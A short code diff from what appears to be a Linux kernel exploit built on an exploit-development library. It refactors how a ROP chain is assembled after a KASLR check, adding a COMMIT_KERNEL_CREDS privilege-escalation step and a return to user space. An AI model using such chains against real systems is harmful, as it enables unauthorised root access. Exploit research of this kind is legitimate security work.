@@ -90,9 +90,9 @@ int main(int argc, const char** argv) {
     check_kaslr_base(kaslr_base);
 
     printf("[+] ROP chain:\n");
-    RopChain rop(kaslr_base);
-    target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
-    RopUtils::Ret2Usr(target, rop, (void*)win);
+    RopChain rop(target, kaslr_base);
+    rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
+    RopUtils::Ret2Usr(rop, (void*)win);
     rop.Add(0xffffffff41414141);
     HexDump::Print(rop.GetData());
 
